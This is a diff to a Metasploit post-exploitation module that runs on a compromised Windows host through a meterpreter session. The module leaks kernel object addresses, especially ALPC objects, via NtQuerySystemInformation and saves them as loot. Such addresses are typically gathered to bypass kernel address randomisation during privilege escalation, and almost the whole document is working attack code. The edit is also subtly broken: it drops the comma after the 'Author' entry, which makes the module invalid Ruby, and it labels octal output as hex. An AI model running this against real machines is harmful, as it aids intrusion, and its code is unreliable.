@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Auxiliary
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
   include Msf::Auxiliary::Report
@@ -21,8 +21,8 @@ class MetasploitModule < Msf::Auxiliary
       },
       'License'        => MSF_LICENSE,
       'Author'         => [
-        'CharlesQuinnDev'
-      ],
+         'CharlesQuinnDev'
+      ]
       'Platform'       => ['win'],
       'SessionTypes'   => ['meterpreter'],
       'Notes'          => {
@@ -33,7 +33,6 @@ class MetasploitModule < Msf::Auxiliary
     ))
     
     register_options([
-      OptInt.new('SESSION', [true, 'The session to run this module on']),
       OptInt.new('MAX_HANDLES', [true, 'Maximum handles to process (0 = unlimited)', 50000]),
       OptInt.new('TIMEOUT', [true, 'Timeout in seconds for enumeration', 30]),
       OptString.new('EXPORT_CSV', [false, 'Export results to CSV file', nil])
@@ -41,20 +40,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    # Get session from datastore
-    session_id = datastore['SESSION']
-    if session_id.nil?
-      print_error("No session selected. Use 'set SESSION [id]'")
-      return
-    end
-
-    # Get the actual session object
-    @sess = framework.sessions.get(session_id)
-    if @sess.nil?
-      print_error("Invalid session ID: #{session_id}")
-      return
-    end
-
     print_status("Windows Kernel Pointer Exposure Enumerator")
     print_line("=" * 80)
     
@@ -86,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
   def validate_environment
     begin
       # Get system info from session
-      sysinfo = @sess.sys.config.sysinfo
+      sysinfo = session.sys.config.sysinfo
       @os = sysinfo['OS']
       @arch = sysinfo['Architecture']
       @computer = sysinfo['Computer']
@@ -94,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Target: #{@computer}")
       print_status("OS: #{@os}")
       print_status("Arch: #{@arch}")
-      print_status("User: #{@sess.sys.config.getuid}")
+      print_status("User: #{session.sys.config.getuid}")
       
       # Check architecture
       unless @arch =~ /x64|64|amd64/i
@@ -118,7 +103,6 @@ class MetasploitModule < Msf::Auxiliary
     begin
       Timeout.timeout(datastore['TIMEOUT']) do
         while attempt < max_attempts
-          # SystemExtendedHandleInformation = 64
           print_status("Attempt #{attempt + 1}: Trying buffer size #{buffer_size} bytes")
           
           # Allocate buffer
@@ -130,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
           end
           
           # Make the call
-          result = @sess.railgun.ntdll.NtQuerySystemInformation(64, buffer, buffer_size, 4)
+          result = session.railgun.ntdll.NtQuerySystemInformation(64, buffer, buffer_size, 4)
           
           if result.nil?
             print_error("NtQuerySystemInformation returned nil")
@@ -147,7 +131,6 @@ class MetasploitModule < Msf::Auxiliary
               buffer_size = result['ReturnLength']
               print_status("Buffer too small, need #{buffer_size} bytes")
             else
-              # Try doubling
               buffer_size *= 2
               print_status("Doubling buffer to #{buffer_size} bytes")
             end
@@ -183,8 +166,8 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Processing #{num_handles} handles...")
         
         # Parse handle entries
-        offset = 16  # Skip NumberOfHandles (8) + Reserved (8)
-        entry_size = 48  # Size of SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
+        offset = 16
+        entry_size = 48
         
         processed = 0
         kernel_pointers = 0
@@ -196,14 +179,12 @@ class MetasploitModule < Msf::Auxiliary
           entry = data[entry_offset, entry_size]
           
           begin
-            # Parse entry fields
             object_ptr = entry[0, 8].unpack('Q').first
             pid = entry[8, 8].unpack('Q').first
             handle = entry[16, 8].unpack('Q').first
             access = entry[24, 4].unpack('V').first
             type_idx = entry[30, 2].unpack('v').first
             
-            # Validate kernel address
             if is_kernel_address?(object_ptr)
               pointers << {
                 address: object_ptr,
@@ -217,7 +198,6 @@ class MetasploitModule < Msf::Auxiliary
             
             processed += 1
             
-            # Show progress every 10,000 handles
             if processed % 10000 == 0
               print_status("  Processed #{processed}/#{num_handles} handles (found #{kernel_pointers} kernel addresses)...")
             end
@@ -242,8 +222,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def is_kernel_address?(addr)
     return false if addr.nil? || addr == 0
-    
-    # x64 canonical kernel addresses have bits 48-63 set to 0xFFFF
     high_bits = (addr >> 48) & 0xFFFF
     high_bits == 0xFFFF
   end
@@ -254,22 +232,18 @@ class MetasploitModule < Msf::Auxiliary
     print_line("KERNEL POINTER EXPOSURE RESULTS")
     print_line("=" * 80)
     
-    # Summary stats
     print_line("\nSUMMARY STATISTICS:")
     print_line("  Total pointers: #{@pointers.size}")
     
-    # Unique addresses
     unique = @pointers.uniq { |p| p[:address] }.size
     print_line("  Unique addresses: #{unique}")
     
-    # Address range
     if @pointers.any?
       min_addr = @pointers.map { |p| p[:address] }.min
       max_addr = @pointers.map { |p| p[:address] }.max
       print_line("  Address range: 0x#{min_addr.to_s(16)} - 0x#{max_addr.to_s(16)}")
     end
     
-    # Group by type
     by_type = @pointers.group_by { |p| p[:type_index] }
     
     print_line("\nOBJECT TYPE DISTRIBUTION:")
@@ -279,7 +253,6 @@ class MetasploitModule < Msf::Auxiliary
       print_line("  Type #{type} (#{type_name}): #{ptrs.size} pointers (#{pct}%)")
     end
     
-    # ALPC specific summary
     alpc_pointers = @pointers.select { |p| (32..48).include?(p[:type_index]) }
     
     if alpc_pointers.any?
@@ -289,18 +262,15 @@ class MetasploitModule < Msf::Auxiliary
       
       print_line("  Total ALPC pointers: #{alpc_pointers.size}")
       
-      # Group ALPC by process
       by_pid = alpc_pointers.group_by { |p| p[:pid] }
       print_line("  Found in #{by_pid.size} processes")
       
-      # Show process list
       print_line("\n  Processes with ALPC pointers:")
       by_pid.sort_by { |_, v| -v.size }.first(10).each do |pid, ptrs|
         proc_name = get_process_name(pid)
         print_line("    #{proc_name} (PID: #{pid}): #{ptrs.size} ALPC pointers")
       end
       
-      # Show sample addresses
       print_line("\n  Sample ALPC kernel addresses:")
       alpc_pointers.first(10).each_with_index do |p, i|
         print_line("    #{i+1}. Type #{p[:type_index]}: 0x#{p[:address].to_s(16)}")
@@ -339,7 +309,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_process_name(pid)
     begin
-      @sess.sys.process.each_process do |p|
+      session.sys.process.each_process do |p|
         return p['name'] if p['pid'] == pid
       end
     rescue
@@ -359,15 +329,25 @@ class MetasploitModule < Msf::Auxiliary
       csv += "#{p[:pid]},#{p[:type_index]},#{type_hint},0x#{p[:handle].to_s(16)},0x#{p[:access].to_s(8)},0x#{p[:address].to_s(16)}\n"
     end
     
+    # Calculate size for user info
+    csv_size = csv.bytesize
+    if csv_size < 1024
+      size_str = "#{csv_size} bytes"
+    elsif csv_size < 1024 * 1024
+      size_str = "#{(csv_size / 1024.0).round(2)} KB"
+    else
+      size_str = "#{(csv_size / (1024.0 * 1024.0)).round(2)} MB"
+    end
+    
     stored_path = store_loot(
       'windows.kernel.pointers',
       'text/csv',
-      @sess,
+      session,
       csv,
       filename,
       'Windows Kernel Pointer Enumeration Results'
     )
     
-    print_good("Results exported to: #{stored_path}")
+    print_good("Results exported to: #{stored_path} (#{size_str})")
   end
 end
